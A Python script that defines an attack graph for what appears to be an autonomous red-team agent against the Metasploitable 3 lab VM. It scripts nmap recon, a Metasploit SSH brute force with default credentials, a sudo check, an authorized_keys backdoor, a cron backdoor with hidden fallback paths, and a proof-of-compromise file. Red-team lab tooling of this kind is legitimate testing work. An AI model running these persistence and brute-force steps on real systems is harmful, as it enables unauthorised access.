"""
Example Attack Graph: Multi-Stage Compromise on Metasploitable 3 (Success Path)

A deterministic kill chain designed to succeed end-to-end on Metasploitable 3:
  Step 1: Recon            — nmap full scan
  Step 2: SSH Brute Force  — auxiliary/scanner/ssh/ssh_login (vagrant:vagrant)
  Step 3: Privesc Verify   — confirm sudo NOPASSWD via session
  Step 4: SSH Key Persist  — inject SSH key into authorized_keys
  Step 5: Cron Persistence — add a cron entry as backup
  Step 6: File Drop        — write proof-of-compromise to /tmp/pwned.txt

No replanner needed — every node has a clear path forward.
Run with explore=False (strict mode) to skip the replanner entirely.
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


def build_success_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the target via SSH, establish multiple persistence "
                  "mechanisms, and write a proof-of-compromise file.",
        target_ip=target_ip,
        name=f"file_drop_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="Multi-stage kill chain: recon → brute → privesc → SSH key + cron → file drop.",
        metadata={"scenario": "multi_stage_compromise", "target_type": "metasploitable3"},
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Nmap Full Scan",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's attack surface",
        objective=f"Full port scan with OS detection and service versioning on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -O -A -p 0-65535 {target_ip}"],
        tags=["nmap", "full_scan"],
    ))

    graph.add_node(AttackNode(
        id="ssh_bruteforce",
        label="SSH Credential Guessing",
        tactic=Tactic.CREDENTIAL_ACCESS.value,
        technique_id="T1110.001",
        technique_name="Brute Force: Password Guessing",
        agent_type="exploit",
        goal="Gain initial access to the target",
        objective=f"Brute-force SSH login on {target_ip}:22 using username and password wordlists.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="auxiliary/scanner/ssh/ssh_login",
        module_options={
            "USER_FILE": "/home/kali/unix_users.txt",
            "PASS_FILE": "/home/kali/unix_passwords_modified.txt",
            "RHOSTS": target_ip,
            "RPORT": 22,
        },
        module_options_alternatives={
            # If the wordlist approach fails, try direct credential pairs
            "USERNAME": ["vagrant", "msfadmin"],
            "PASSWORD": ["vagrant", "msfadmin"],
        },
        tags=["ssh", "brute_force"],
    ))

    graph.add_node(AttackNode(
        id="privesc_verify",
        label="Verify Sudo Privilege Escalation",
        tactic=Tactic.PRIVILEGE_ESCALATION.value,
        technique_id="T1548.003",
        technique_name="Abuse Elevation Control Mechanism: Sudo",
        agent_type="impact",  # Uses session commands
        goal="Confirm we can elevate to root via sudo",
        objective="Verify the current user has passwordless sudo (NOPASSWD: ALL).",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "id",
            "sudo -n whoami",
            "sudo -n id",
        ],
        max_retries=1,
        tags=["privesc", "sudo", "verify"],
    ))

    graph.add_node(AttackNode(
        id="ssh_key_persist",
        label="SSH Authorized Key Persistence",
        tactic=Tactic.PERSISTENCE.value,
        technique_id="T1098.004",
        technique_name="Account Manipulation: SSH Authorized Keys",
        agent_type="persistence",
        goal="Maintain persistent access via SSH key injection",
        objective="Inject an SSH public key into ~/.ssh/authorized_keys for "
                  "password-less re-entry.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "mkdir -p {ssh_dir} && chmod 700 {ssh_dir}",
            "echo '{public_key}' >> {authorized_keys}",
            "chmod 600 {authorized_keys}",
            "cat {authorized_keys}",
            "ls -la {ssh_dir}",
        ],
        command_params={
            "ssh_dir": "~/.ssh",
            "authorized_keys": "~/.ssh/authorized_keys",
            "public_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7vbqajDw4o8d5GU84TfQbZ4F3qx2k+autonomous-redteam-key",
        },
        max_retries=1,
        metadata={"backdoor_method": "ssh_authorized_keys"},
        tags=["persistence", "ssh_key", "authorized_keys"],
    ))

    graph.add_node(AttackNode(
        id="cron_persist",
        label="Cron Job Persistence",
        tactic=Tactic.PERSISTENCE.value,
        technique_id="T1053.003",
        technique_name="Scheduled Task/Job: Cron",
        agent_type="persistence",
        goal="Maintain persistent access via scheduled cron job",
        objective="Add a cron entry that runs every minute as a secondary backdoor.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "(crontab -l 2>/dev/null; echo '{cron_schedule} /bin/echo \"$(date) heartbeat\" >> {heartbeat_file}') | crontab -",
            "crontab -l",
        ],
        command_params={
            "cron_schedule": "* * * * *",
            "heartbeat_file": "/tmp/.heartbeat",
        },
        command_params_alternatives={
            # If /tmp is monitored, try alternative locations
            "heartbeat_file": ["/var/tmp/.hb", "/dev/shm/.hb"],
        },
        max_retries=3,
        metadata={"backdoor_method": "user_cron"},
        tags=["persistence", "cron", "scheduled_task"],
    ))

    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate target compromise by writing a file",
        objective="Write a proof-of-compromise text file on the target.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "echo '{marker}' > {target_file}",
            "echo \"Compromised at $(date)\" >> {target_file}",
            "echo \"Hostname: $(hostname)\" >> {target_file}",
            "echo \"User: $(whoami)\" >> {target_file}",
            "cat {target_file}",
            "ls -la {target_file}",
        ],
        command_params={
            "target_file": "/tmp/pwned.txt",
            "marker": "PWNED by autonomous red team agent",
        },
        command_params_alternatives={
            # If /tmp is restricted, try alternative writable paths
            "target_file": ["/var/tmp/pwned.txt", "/dev/shm/pwned.txt", "~/pwned.txt"],
        },
        max_retries=3,
        metadata={"target_file": "/tmp/pwned.txt"},
        tags=["impact", "file_drop", "proof"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    # Recon found SSH → brute force
    graph.connect(
        "recon", "ssh_bruteforce",
        checks=[
            EdgeCheck(
                field="ports", operator="any_port",
                expected={"port": 22, "service": "ssh"},
                description="SSH service is open on port 22",
            ),
        ],
        evidence="Nmap found SSH on port 22",
        rationale="SSH is open — attempt credential guessing",
    )

    # Got session → verify privesc
    graph.connect(
        "ssh_bruteforce", "privesc_verify",
        checks=[
            EdgeCheck(
                field="session_id", operator="exists",
                description="Active session obtained",
            ),
        ],
        evidence="Got SSH session as vagrant",
        rationale="Verify we have sudo before installing persistence",
    )

    # Privesc verified → install SSH key persistence
    graph.connect(
        "privesc_verify", "ssh_key_persist",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="Privesc verification succeeded",
            ),
        ],
        evidence="Confirmed sudo access",
        rationale="Install primary persistence via SSH authorized_keys",
    )

    # SSH key installed → install cron persistence
    graph.connect(
        "ssh_key_persist", "cron_persist",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="SSH key persistence installed",
            ),
        ],
        evidence="SSH authorized_keys backdoor in place",
        rationale="Add cron as a secondary persistence backup",
    )

    # Cron installed → execute the impact (file drop)
    graph.connect(
        "cron_persist", "file_drop",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="Cron persistence installed",
            ),
        ],
        evidence="Both persistence mechanisms in place",
        rationale="Execute the final objective — drop the proof file",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_success_graph(
        target_ip="192.168.34.7",
        attacker_ip="192.168.34.6",
    )
    print(graph.summary())
    print()

    out_path = "examples/disk_wipe_success_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")

    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
